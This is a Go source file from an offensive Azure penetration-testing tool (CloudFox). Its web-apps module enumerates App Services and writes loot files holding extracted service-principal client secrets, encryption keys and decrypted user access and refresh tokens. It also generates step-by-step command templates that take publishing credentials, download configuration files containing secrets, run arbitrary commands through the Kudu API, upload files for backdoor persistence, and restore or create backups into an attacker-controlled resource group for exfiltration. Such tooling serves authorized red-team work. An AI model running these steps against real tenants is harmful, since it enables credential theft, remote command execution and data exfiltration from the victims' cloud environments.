package commands

import (
	"context"
	"fmt"
	"sync"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/spf13/cobra"
)

// ------------------------------
// Cobra command
// ------------------------------
var AzWebAppsCommand = &cobra.Command{
	Use:     "web-apps",
	Aliases: []string{"webapps"},
	Short:   "Enumerate Azure Web & App Services",
	Long: `
Enumerate Azure Web Apps, App Services, and Function Apps for a specific tenant:
./cloudfox az webapps --tenant TENANT_ID

Enumerate Azure Web Apps, App Services, and Function Apps for a specific subscription:
./cloudfox az webapps --subscription SUBSCRIPTION_ID`,
	Run: ListWebApps,
}

// ------------------------------
// Module struct (AWS pattern)
// ------------------------------
type WebAppsModule struct {
	azinternal.BaseAzureModule // Embed common fields (15 fields)

	// Module-specific fields
	Subscriptions []string
	WebAppRows    [][]string
	LootMap       map[string]*internal.LootFile
	mu            sync.Mutex
}

// ------------------------------
// Output struct
// ------------------------------
type WebAppsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o WebAppsOutput) TableFiles() []internal.TableFile { return o.Table }
func (o WebAppsOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Cobra command entry point (thin wrapper)
// ------------------------------
func ListWebApps(cmd *cobra.Command, args []string) {
	// -------------------- Use InitializeCommandContext helper --------------------
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_WEBAPPS_MODULE_NAME)
	if err != nil {
		return // error already logged by helper
	}
	defer cmdCtx.Session.StopMonitoring()

	// -------------------- Initialize module --------------------
	module := &WebAppsModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 5),
		Subscriptions:   cmdCtx.Subscriptions,
		WebAppRows:      [][]string{},
		LootMap: map[string]*internal.LootFile{
			"webapps-configuration":     {Name: "webapps-configuration", Contents: ""},
			"webapps-connectionstrings": {Name: "webapps-connectionstrings", Contents: ""},
			"webapps-commands":          {Name: "webapps-commands", Contents: ""},
			"webapps-bulk-commands":     {Name: "webapps-bulk-commands", Contents: ""},
			"webapps-easyauth-tokens":   {Name: "webapps-easyauth-tokens", Contents: ""},
			"webapps-easyauth-sp":       {Name: "webapps-easyauth-sp", Contents: ""},
			"webapps-kudu-commands":     {Name: "webapps-kudu-commands", Contents: ""},
			"webapps-backup-commands":   {Name: "webapps-backup-commands", Contents: ""},
		},
	}

	// -------------------- Execute module --------------------
	module.PrintWebApps(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Main module method (AWS-style)
// ------------------------------
func (m *WebAppsModule) PrintWebApps(ctx context.Context, logger internal.Logger) {
	// Multi-tenant processing
	if m.IsMultiTenant {
		logger.InfoM(fmt.Sprintf("Multi-tenant mode: Processing %d tenants", len(m.Tenants)), globals.AZ_WEBAPPS_MODULE_NAME)

		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context for row creation
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_WEBAPPS_MODULE_NAME)
			}

			// Process subscriptions for this tenant
			m.RunSubscriptionEnumeration(ctx, logger, tenantCtx.Subscriptions, globals.AZ_WEBAPPS_MODULE_NAME, m.processSubscription)

			// Restore tenant context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
		}
	} else {
		// Single tenant processing (existing logic)
		logger.InfoM(fmt.Sprintf("Enumerating Web Apps for %d subscription(s)", len(m.Subscriptions)), globals.AZ_WEBAPPS_MODULE_NAME)
		m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_WEBAPPS_MODULE_NAME, m.processSubscription)
	}

	// Generate Kudu API access commands
	m.generateKuduLoot()

	// Generate backup access commands
	m.generateBackupLoot()

	// Generate and write output
	m.writeOutput(ctx, logger)
}

// ------------------------------
// Process single subscription
// ------------------------------
func (m *WebAppsModule) processSubscription(ctx context.Context, subID string, logger internal.Logger) {
	// Get resource groups (CACHED)
	resourceGroups := m.ResolveResourceGroups(subID)

	// Process resource groups concurrently for better performance
	var rgWg sync.WaitGroup
	rgSemaphore := make(chan struct{}, 10) // Limit to 10 concurrent RGs

	for _, rgName := range resourceGroups {
		rgWg.Add(1)
		go m.processResourceGroup(ctx, subID, rgName, &rgWg, rgSemaphore)
	}

	rgWg.Wait()
}

// ------------------------------
// Process single resource group (extracted for RG-level concurrency)
// ------------------------------
func (m *WebAppsModule) processResourceGroup(ctx context.Context, subID, rgName string, wg *sync.WaitGroup, semaphore chan struct{}) {
	defer wg.Done()

	// Acquire semaphore
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	// ==================== EASY AUTH CONFIG CHECK (for EntraID Centralized Auth column) ====================
	// Get the actual web app objects for Easy Auth processing
	webApps, err := azinternal.GetWebAppsPerResourceGroup(m.Session, subID, rgName)
	if err != nil || len(webApps) == 0 {
		// If we can't get webApps, still process with empty auth map
		webAppsData := azinternal.GetWebAppsPerRGWithAuth(ctx, subID, m.LootMap, rgName, make(map[string]bool), m.TenantName, m.TenantID)
		m.mu.Lock()
		m.WebAppRows = append(m.WebAppRows, webAppsData...)
		m.mu.Unlock()
		return
	}

	// Check which apps have Easy Auth enabled and get their configs
	authConfigs := azinternal.GetWebAppAuthConfigs(m.Session, subID, webApps)

	// Create a map of app names with Easy Auth enabled for quick lookup
	authEnabledApps := make(map[string]bool)
	for _, config := range authConfigs {
		authEnabledApps[config.AppName] = true
	}

	// Use existing helper function - returns [][]string rows directly
	webAppsData := azinternal.GetWebAppsPerRGWithAuth(ctx, subID, m.LootMap, rgName, authEnabledApps, m.TenantName, m.TenantID)

	// Thread-safe append
	m.mu.Lock()
	m.WebAppRows = append(m.WebAppRows, webAppsData...)
	m.mu.Unlock()

	// ==================== EASY AUTH TOKEN EXTRACTION ====================

	// Get access token for API calls
	token, err := m.Session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return
	}

	// Extract and decrypt tokens from each app with Easy Auth
	for _, config := range authConfigs {
		// Add Service Principal credentials to loot
		m.mu.Lock()
		m.LootMap["webapps-easyauth-sp"].Contents += fmt.Sprintf(
			"## Web App: %s\n"+
				"# Resource Group: %s\n"+
				"# Client ID: %s\n"+
				"# Client Secret: %s\n"+
				"# Tenant ID: %s\n"+
				"# Encryption Key: %s\n"+
				"# Kudu URL: %s\n\n",
			config.AppName,
			config.ResourceGroup,
			config.ClientID,
			config.ClientSecret,
			config.TenantID,
			config.EncryptionKey,
			config.KuduURL,
		)
		m.mu.Unlock()

		// Extract and decrypt tokens
		tokens := azinternal.ExtractAndDecryptTokens(config, token)
		for _, tok := range tokens {
			m.mu.Lock()
			m.LootMap["webapps-easyauth-tokens"].Contents += fmt.Sprintf(
				"## Web App: %s, User: %s\n"+
					"# Access Token: %s\n"+
					"# Refresh Token: %s\n"+
					"# Expires On: %s\n"+
					"# Raw JSON:\n%s\n\n",
				tok.AppName,
				tok.UserID,
				tok.AccessToken,
				tok.RefreshToken,
				tok.ExpiresOn,
				tok.RawJSON,
			)
			m.mu.Unlock()
		}
	}
}

// ------------------------------
// Write output (AWS-style writeLoot pattern)
// ------------------------------
func (m *WebAppsModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if len(m.WebAppRows) == 0 {
		logger.InfoM("No Web Apps found", globals.AZ_WEBAPPS_MODULE_NAME)
		return
	}

	// Build headers
	headers := []string{
		"Tenant Name", // NEW: for multi-tenant support
		"Tenant ID",   // NEW: for multi-tenant support
		"Subscription ID",
		"Subscription Name",
		"Resource Group",
		"Region",
		"App Name",
		"App Service Plan",
		"Runtime",
		"Tags",
		"Private IPs",
		"Public IPs",
		"VNet Name",
		"Subnet",
		"DNS Name",
		"URL",
		"Credentials",
		"HTTPS Only",
		"Min TLS Version",
		"EntraID Centralized Auth",
		"System Assigned Identity ID",
		"User Assigned Identity ID",
	}

	// Check if we should split output by tenant (multi-tenant mode)
	if azinternal.ShouldSplitByTenant(m.IsMultiTenant, m.Tenants) {
		// Split into separate tenant directories
		if err := m.FilterAndWritePerTenantAuto(
			ctx,
			logger,
			m.Tenants,
			m.WebAppRows,
			headers,
			"webapps",
			globals.AZ_WEBAPPS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Check if we should split output by subscription (multiple subs WITHOUT --tenant flag, single tenant)
	if azinternal.ShouldSplitBySubscription(m.Subscriptions, m.TenantFlagPresent) {
		if err := m.FilterAndWritePerSubscriptionAuto(
			ctx, logger, m.Subscriptions, m.WebAppRows, headers,
			"webapps", globals.AZ_WEBAPPS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Build loot array
	loot := []internal.LootFile{}
	for _, lf := range m.LootMap {
		if lf.Contents != "" {
			loot = append(loot, *lf)
		}
	}

	// Create output
	output := WebAppsOutput{
		Table: []internal.TableFile{{
			Name:   "webapps",
			Header: headers,
			Body:   m.WebAppRows,
		}},
		Loot: loot,
	}

	// Determine output scope (single subscription vs tenant-wide consolidation)
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Write output using HandleOutputSmart (automatic streaming for large datasets)
	if err := internal.HandleOutputSmart(
		"Azure",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIDs,
		scopeNames,
		m.UserUPN,
		output,
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_WEBAPPS_MODULE_NAME)
		m.CommandCounter.Error++
	}

	logger.SuccessM(fmt.Sprintf("Found %d Web App(s) across %d subscription(s)", len(m.WebAppRows), len(m.Subscriptions)), globals.AZ_WEBAPPS_MODULE_NAME)
}

// ------------------------------
// Generate Kudu API access commands
// ------------------------------
func (m *WebAppsModule) generateKuduLoot() {
	// Extract unique web apps
	type WebAppInfo struct {
		SubscriptionID, SubscriptionName, ResourceGroup, AppName string
	}

	uniqueWebApps := make(map[string]WebAppInfo)

	for _, row := range m.WebAppRows {
		if len(row) < 7 { // Updated for tenant columns
			continue
		}

		subID := row[2]   // Shifted by +2 for tenant columns
		subName := row[3] // Shifted by +2 for tenant columns
		rgName := row[4]  // Shifted by +2 for tenant columns
		appName := row[6] // Shifted by +2 for tenant columns

		key := subID + "/" + rgName + "/" + appName
		uniqueWebApps[key] = WebAppInfo{
			SubscriptionID:   subID,
			SubscriptionName: subName,
			ResourceGroup:    rgName,
			AppName:          appName,
		}
	}

	if len(uniqueWebApps) == 0 {
		return
	}

	lf := m.LootMap["webapps-kudu-commands"]
	lf.Contents += "# Kudu API Access Commands\n"
	lf.Contents += "# NOTE: Kudu (SCM) provides powerful remote access to web app filesystems and processes.\n"
	lf.Contents += "# Kudu endpoints: https://<webapp>.scm.azurewebsites.net\n"
	lf.Contents += "# Requires publishing credentials (deployment credentials).\n\n"

	for _, app := range uniqueWebApps {
		lf.Contents += fmt.Sprintf("## Web App: %s (Subscription: %s, RG: %s)\n", app.AppName, app.SubscriptionID, app.ResourceGroup)
		lf.Contents += fmt.Sprintf("# Set subscription context\n")
		lf.Contents += fmt.Sprintf("az account set --subscription %s\n\n", app.SubscriptionID)

		// Get publishing credentials
		lf.Contents += fmt.Sprintf("# Step 1: Get Kudu publishing credentials\n")
		lf.Contents += fmt.Sprintf("az webapp deployment list-publishing-credentials \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  --query '{username:publishingUserName,password:publishingPassword}' \\\n")
		lf.Contents += fmt.Sprintf("  -o json\n\n")

		lf.Contents += fmt.Sprintf("# Save credentials to variables\n")
		lf.Contents += fmt.Sprintf("KUDU_USER=$(az webapp deployment list-publishing-credentials --resource-group %s --name %s --query 'publishingUserName' -o tsv)\n", app.ResourceGroup, app.AppName)
		lf.Contents += fmt.Sprintf("KUDU_PASS=$(az webapp deployment list-publishing-credentials --resource-group %s --name %s --query 'publishingPassword' -o tsv)\n", app.ResourceGroup, app.AppName)
		lf.Contents += fmt.Sprintf("KUDU_URL=\"https://%s.scm.azurewebsites.net\"\n\n", app.AppName)

		// List files
		lf.Contents += fmt.Sprintf("# Step 2: List files in wwwroot directory\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/vfs/site/wwwroot/\" | jq\n\n")

		// Download specific files
		lf.Contents += fmt.Sprintf("# Step 3: Download web.config (contains connection strings, app settings)\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/vfs/site/wwwroot/web.config\" -o web.config\n\n")

		lf.Contents += fmt.Sprintf("# Download appsettings.json (ASP.NET Core apps)\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/vfs/site/wwwroot/appsettings.json\" -o appsettings.json\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/vfs/site/wwwroot/appsettings.Production.json\" -o appsettings.Production.json\n\n")

		// Browse directories
		lf.Contents += fmt.Sprintf("# Step 4: Recursively list all files (browse entire filesystem)\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/vfs/site/\" | jq\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/vfs/site/wwwroot/bin/\" | jq\n\n")

		// Download entire site
		lf.Contents += fmt.Sprintf("# Step 5: Download entire site as ZIP\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/zip/site/wwwroot/\" -o %s-wwwroot.zip\n\n", app.AppName)

		// Execute commands
		lf.Contents += fmt.Sprintf("# Step 6: Execute arbitrary commands via Kudu API\n")
		lf.Contents += fmt.Sprintf("# Windows example: list environment variables\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \\\n")
		lf.Contents += fmt.Sprintf("  \"$KUDU_URL/api/command\" \\\n")
		lf.Contents += fmt.Sprintf("  -H \"Content-Type: application/json\" \\\n")
		lf.Contents += fmt.Sprintf("  -d '{\"command\":\"set\",\"dir\":\"site\\\\\\\\wwwroot\"}'\n\n")

		lf.Contents += fmt.Sprintf("# Linux example: list processes\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \\\n")
		lf.Contents += fmt.Sprintf("  \"$KUDU_URL/api/command\" \\\n")
		lf.Contents += fmt.Sprintf("  -H \"Content-Type: application/json\" \\\n")
		lf.Contents += fmt.Sprintf("  -d '{\"command\":\"ps aux\",\"dir\":\"/home/site/wwwroot\"}'\n\n")

		lf.Contents += fmt.Sprintf("# Read environment variables (contains secrets, connection strings)\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/settings\" | jq\n\n")

		// Download logs
		lf.Contents += fmt.Sprintf("# Step 7: Download application logs\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/logs/recent\" | jq\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/vfs/LogFiles/\" | jq\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/dump\" -o %s-dump.zip\n\n", app.AppName)

		// Upload files (persistence)
		lf.Contents += fmt.Sprintf("# Step 8: Upload file (for persistence or backdoors - HIGHLY DETECTABLE)\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \\\n")
		lf.Contents += fmt.Sprintf("  \"$KUDU_URL/api/vfs/site/wwwroot/test.txt\" \\\n")
		lf.Contents += fmt.Sprintf("  -X PUT \\\n")
		lf.Contents += fmt.Sprintf("  -H \"Content-Type: application/octet-stream\" \\\n")
		lf.Contents += fmt.Sprintf("  --data-binary \"@localfile.txt\"\n\n")

		// Process explorer
		lf.Contents += fmt.Sprintf("# Step 9: Process explorer (view running processes)\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/processes\" | jq\n\n")

		// Environment info
		lf.Contents += fmt.Sprintf("# Step 10: Get environment information\n")
		lf.Contents += fmt.Sprintf("curl -u \"$KUDU_USER:$KUDU_PASS\" \"$KUDU_URL/api/environment\" | jq\n\n")

		// PowerShell equivalents
		lf.Contents += fmt.Sprintf("## PowerShell Equivalents\n")
		lf.Contents += fmt.Sprintf("Set-AzContext -SubscriptionId %s\n\n", app.SubscriptionID)

		lf.Contents += fmt.Sprintf("# Get publishing credentials\n")
		lf.Contents += fmt.Sprintf("$publishProfile = Get-AzWebAppPublishingProfile -ResourceGroupName %s -Name %s\n", app.ResourceGroup, app.AppName)
		lf.Contents += fmt.Sprintf("# Parse XML to extract credentials\n")
		lf.Contents += fmt.Sprintf("[xml]$xml = $publishProfile\n")
		lf.Contents += fmt.Sprintf("$publishData = $xml.publishData.publishProfile | Where-Object { $_.publishMethod -eq 'MSDeploy' }\n")
		lf.Contents += fmt.Sprintf("$userName = $publishData.userName\n")
		lf.Contents += fmt.Sprintf("$userPWD = $publishData.userPWD\n")
		lf.Contents += fmt.Sprintf("$kuduUrl = \"https://%s.scm.azurewebsites.net\"\n\n", app.AppName)

		lf.Contents += fmt.Sprintf("# Create credential object for PowerShell Invoke-RestMethod\n")
		lf.Contents += fmt.Sprintf("$pair = \"$($userName):$($userPWD)\"\n")
		lf.Contents += fmt.Sprintf("$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))\n")
		lf.Contents += fmt.Sprintf("$headers = @{ Authorization = \"Basic $encodedCreds\" }\n\n")

		lf.Contents += fmt.Sprintf("# List files\n")
		lf.Contents += fmt.Sprintf("Invoke-RestMethod -Uri \"$kuduUrl/api/vfs/site/wwwroot/\" -Headers $headers | ConvertTo-Json\n\n")

		lf.Contents += fmt.Sprintf("# Download file\n")
		lf.Contents += fmt.Sprintf("Invoke-RestMethod -Uri \"$kuduUrl/api/vfs/site/wwwroot/web.config\" -Headers $headers -OutFile \"web.config\"\n\n")

		lf.Contents += fmt.Sprintf("# Execute command\n")
		lf.Contents += fmt.Sprintf("$body = @{ command = 'whoami'; dir = 'site\\wwwroot' } | ConvertTo-Json\n")
		lf.Contents += fmt.Sprintf("Invoke-RestMethod -Uri \"$kuduUrl/api/command\" -Headers $headers -Method Post -Body $body -ContentType 'application/json'\n\n")

		lf.Contents += fmt.Sprintf("---\n\n")
	}
}

// ------------------------------
// Generate backup access commands
// ------------------------------
func (m *WebAppsModule) generateBackupLoot() {
	// Extract unique web apps
	type WebAppInfo struct {
		SubscriptionID, SubscriptionName, ResourceGroup, AppName string
	}

	uniqueWebApps := make(map[string]WebAppInfo)

	for _, row := range m.WebAppRows {
		if len(row) < 7 { // Updated for tenant columns
			continue
		}

		subID := row[2]   // Shifted by +2 for tenant columns
		subName := row[3] // Shifted by +2 for tenant columns
		rgName := row[4]  // Shifted by +2 for tenant columns
		appName := row[6] // Shifted by +2 for tenant columns

		key := subID + "/" + rgName + "/" + appName
		uniqueWebApps[key] = WebAppInfo{
			SubscriptionID:   subID,
			SubscriptionName: subName,
			ResourceGroup:    rgName,
			AppName:          appName,
		}
	}

	if len(uniqueWebApps) == 0 {
		return
	}

	lf := m.LootMap["webapps-backup-commands"]
	lf.Contents += "# Web App Backup Access Commands\n"
	lf.Contents += "# NOTE: Web app backups contain:\n"
	lf.Contents += "#   - Complete application code and configuration\n"
	lf.Contents += "#   - Database backups (if configured)\n"
	lf.Contents += "#   - Site content and files\n"
	lf.Contents += "#   - Historical versions of the application\n\n"

	for _, app := range uniqueWebApps {
		lf.Contents += fmt.Sprintf("## Web App: %s (Subscription: %s, RG: %s)\n", app.AppName, app.SubscriptionID, app.ResourceGroup)
		lf.Contents += fmt.Sprintf("# Set subscription context\n")
		lf.Contents += fmt.Sprintf("az account set --subscription %s\n\n", app.SubscriptionID)

		// List backups
		lf.Contents += fmt.Sprintf("# Step 1: List all available backups\n")
		lf.Contents += fmt.Sprintf("az webapp config backup list \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --webapp-name %s \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  -o table\n\n")

		lf.Contents += fmt.Sprintf("# List backups with full details (JSON)\n")
		lf.Contents += fmt.Sprintf("az webapp config backup list \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --webapp-name %s \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  -o json | jq\n\n")

		// Show backup configuration
		lf.Contents += fmt.Sprintf("# Step 2: Show backup configuration (includes storage account)\n")
		lf.Contents += fmt.Sprintf("az webapp config backup show \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --webapp-name %s\n\n", app.AppName)

		// Restore backup to same app
		lf.Contents += fmt.Sprintf("# Step 3: Restore backup to the same web app (HIGHLY DETECTABLE - overwrites current app)\n")
		lf.Contents += fmt.Sprintf("az webapp config backup restore \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --webapp-name %s \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  --backup-name <BACKUP-NAME> \\\n")
		lf.Contents += fmt.Sprintf("  --overwrite\n\n")

		// Restore backup to new app
		lf.Contents += fmt.Sprintf("# Step 4: Restore backup to NEW web app (less detectable)\n")
		lf.Contents += fmt.Sprintf("# First, create a new web app\n")
		lf.Contents += fmt.Sprintf("az webapp create \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group <ATTACKER-RG> \\\n")
		lf.Contents += fmt.Sprintf("  --name %s-restore \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  --plan <APP-SERVICE-PLAN>\n\n")

		lf.Contents += fmt.Sprintf("# Then restore backup to the new app\n")
		lf.Contents += fmt.Sprintf("az webapp config backup restore \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group <ATTACKER-RG> \\\n")
		lf.Contents += fmt.Sprintf("  --webapp-name %s-restore \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  --backup-name <BACKUP-NAME> \\\n")
		lf.Contents += fmt.Sprintf("  --target-name %s-restore\n\n", app.AppName)

		// Download backup files directly from storage
		lf.Contents += fmt.Sprintf("# Step 5: Download backup files directly from storage account\n")
		lf.Contents += fmt.Sprintf("# First, get the storage account details from backup configuration\n")
		lf.Contents += fmt.Sprintf("STORAGE_URL=$(az webapp config backup show --resource-group %s --webapp-name %s --query 'storageAccountUrl' -o tsv)\n", app.ResourceGroup, app.AppName)
		lf.Contents += fmt.Sprintf("echo \"Storage URL with SAS: $STORAGE_URL\"\n\n")

		lf.Contents += fmt.Sprintf("# Download backup file using the SAS URL\n")
		lf.Contents += fmt.Sprintf("# The backup configuration contains a SAS URL that can be used to download backups\n")
		lf.Contents += fmt.Sprintf("curl \"$STORAGE_URL\" -o %s-backup.zip\n\n", app.AppName)

		lf.Contents += fmt.Sprintf("# Alternatively, if you have storage account access\n")
		lf.Contents += fmt.Sprintf("# List all backup files in the storage container\n")
		lf.Contents += fmt.Sprintf("# Note: Parse the storage account and container from STORAGE_URL\n")
		lf.Contents += fmt.Sprintf("# az storage blob list --account-name <STORAGE-ACCOUNT> --container-name <CONTAINER> --auth-mode login\n\n")

		// Deployment slots
		lf.Contents += fmt.Sprintf("# Step 6: Access backups from deployment slots\n")
		lf.Contents += fmt.Sprintf("# List deployment slots\n")
		lf.Contents += fmt.Sprintf("az webapp deployment slot list \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --name %s \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  -o table\n\n")

		lf.Contents += fmt.Sprintf("# List backups for a specific slot\n")
		lf.Contents += fmt.Sprintf("az webapp config backup list \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --webapp-name %s \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  --slot <SLOT-NAME> \\\n")
		lf.Contents += fmt.Sprintf("  -o table\n\n")

		// Create on-demand backup
		lf.Contents += fmt.Sprintf("# Step 7: Create on-demand backup (for exfiltration)\n")
		lf.Contents += fmt.Sprintf("az webapp config backup create \\\n")
		lf.Contents += fmt.Sprintf("  --resource-group %s \\\n", app.ResourceGroup)
		lf.Contents += fmt.Sprintf("  --webapp-name %s \\\n", app.AppName)
		lf.Contents += fmt.Sprintf("  --container-url \"<STORAGE-CONTAINER-URL-WITH-SAS>\" \\\n")
		lf.Contents += fmt.Sprintf("  --backup-name \"%s-manual-backup\"\n\n", app.AppName)

		// PowerShell equivalents
		lf.Contents += fmt.Sprintf("## PowerShell Equivalents\n")
		lf.Contents += fmt.Sprintf("Set-AzContext -SubscriptionId %s\n\n", app.SubscriptionID)

		lf.Contents += fmt.Sprintf("# List backups\n")
		lf.Contents += fmt.Sprintf("Get-AzWebAppBackupList -ResourceGroupName %s -Name %s\n\n", app.ResourceGroup, app.AppName)

		lf.Contents += fmt.Sprintf("# Get backup configuration\n")
		lf.Contents += fmt.Sprintf("Get-AzWebAppBackupConfiguration -ResourceGroupName %s -Name %s\n\n", app.ResourceGroup, app.AppName)

		lf.Contents += fmt.Sprintf("# Restore backup\n")
		lf.Contents += fmt.Sprintf("Restore-AzWebAppBackup -ResourceGroupName %s -Name %s -BackupId <BACKUP-ID> -Overwrite\n\n", app.ResourceGroup, app.AppName)

		lf.Contents += fmt.Sprintf("# Create on-demand backup\n")
		lf.Contents += fmt.Sprintf("$storageAccount = Get-AzStorageAccount -ResourceGroupName <STORAGE-RG> -Name <STORAGE-ACCOUNT>\n")
		lf.Contents += fmt.Sprintf("$container = Get-AzStorageContainer -Name <CONTAINER> -Context $storageAccount.Context\n")
		lf.Contents += fmt.Sprintf("$sasToken = New-AzStorageContainerSASToken -Name <CONTAINER> -Permission rwdl -Context $storageAccount.Context -ExpiryTime (Get-Date).AddDays(7)\n")
		lf.Contents += fmt.Sprintf("$sasUrl = $container.CloudBlobContainer.Uri.AbsoluteUri + $sasToken\n")
		lf.Contents += fmt.Sprintf("New-AzWebAppBackup -ResourceGroupName %s -Name %s -StorageAccountUrl $sasUrl\n\n", app.ResourceGroup, app.AppName)

		lf.Contents += fmt.Sprintf("# List deployment slots\n")
		lf.Contents += fmt.Sprintf("Get-AzWebAppSlot -ResourceGroupName %s -Name %s\n\n", app.ResourceGroup, app.AppName)

		lf.Contents += fmt.Sprintf("---\n\n")
	}
}
